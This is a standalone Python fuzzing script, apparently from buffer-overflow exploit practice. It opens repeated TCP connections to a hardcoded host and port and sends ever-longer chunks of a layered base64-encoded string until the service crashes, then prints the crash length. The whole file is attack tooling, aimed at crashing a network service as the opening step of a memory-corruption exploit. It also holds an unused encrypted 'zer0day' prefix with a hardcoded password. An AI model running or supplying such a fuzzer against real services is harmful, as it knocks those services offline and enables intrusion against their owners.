#!/usr/bin/env python3

import socket,time,sys,pyAesCrypt,io

ip = "10.0.0.151"
def encryptData(buff):
	pbdata = str.encode(buff)
	fIn = io.BytesIO(pbdata)
	fCiph = io.BytesIO()
	pyAesCrypt.encryptStream(fIn, fCiph, 'password', 4096)
	dataToSend = fCiph.getvalue()
	return dataToSend
port = 9999
timeout = 5
st = 100
prefix = str(encryptData('zer0day'))

string = "VVZWb1NWTkZhRWxUUldoSlUwVm9TVk5GYUVsVFJXaEpVbFZ3U1ZaRmNFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4U1ZYaE5WRVY0VFZSRmVFMVVSWGhOVkVWNFRWUkZlRkpVUlhoTlZFVjRUVlJGZUUxVVJYaE5WRVY0VVZGVlJrSlJWVVpDVVZWR1FsRlZSa0pSVm1oaFYyeHdZVmRzY0dGWGJIQmhWMnh3WVZkc2NHRlhiSEJoVjJzMVdWZEdhRmxYUm1oWlYwWm9XVmRHYUZsWFJtaFpWMFpuUzFGVmFFbFRSV2hKVTBWb1NWTkZhRWxUUldoSlUwVm9TVkpWY0VsV1JYQk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVVsVjRUVlJGZUUxVVJYaE5WRVY0VFZSRmVFMVVSWGhTVkVWNFRWUkZlRTFVUlhoTlZFVjRUVlJGZUZGUlZVWkNVVlZHUWxGVlJrSlJWVVpDVVZab1lWZHNjR0ZYYkhCaFYyeHdZVmRzY0dGWGJIQmhWMnh3WVZkck5WbFhSbWhaVjBab1dWZEdhRmxYUm1oWlYwWm9XVmRHWjB0UlZXaEpVMFZvU1ZORmFFbFRSV2hKVTBWb1NWTkZhRWxTVlhCSlZrVndURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGSlZlRTFVUlhoTlZFVjRUVlJGZUUxVVJYaE5WRVY0VWxSRmVFMVVSWGhOVkVWNFRWUkZlRTFVUlhoUlVWVkdRbEZWUmtKUlZVWkNVVlZHUWxGV2FHRlhiSEJoVjJ4d1lWZHNjR0ZYYkhCaFYyeHdZVmRzY0dGWGF6VlpWMFpvV1ZkR2FGbFhSbWhaVjBab1dWZEdhRmxYUm1kTFVWVm9TVk5GYUVsVFJXaEpVMFZvU1ZORmFFbFRSV2hKVWxWd1NWWkZjRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFNWWGhOVkVWNFRWUkZlRTFVUlhoTlZFVjRUVlJGZUZKVVJYaE5WRVY0VFZSRmVFMVVSWGhOVkVWNFVWRlZSa0pSVlVaQ1VWVkdRbEZWUmtKUlZtaGhWMnh3WVZkc2NHRlhiSEJoVjJ4d1lWZHNjR0ZYYkhCaFYyczFXVmRHYUZsWFJtaFpWMFpvV1ZkR2FGbFhSbWhaVjBablMyTXlWbWhhYlRsMFpVZGFiR016Wkd4amJtUjNURWRrYkdOdFkwdGtTRWxMWkVoS2IyUkliSGxoYlZaNVdtMXZTMlJIVGpCak1sRkxZek5vTUdOdFowdGpibEpyUTIxdlMyVlhiMHRrUjNBd1pWZHdNR1ZZYkd0bFdGSnVXbTF3TldSSFduRmxXRkpyWVcxb05XUkhValZrUjFKeFpWaFNOV1JIVW5GbFdGSnhXa2hzTUVOblBUMD0="

while True:

  buff = string[0:st]
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(buff) ))
      st+=100
      s.send(bytes(buff, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(buff) ))
    print('ran out of bytes or crashed')
    sys.exit(0)
  time.sleep(.5)
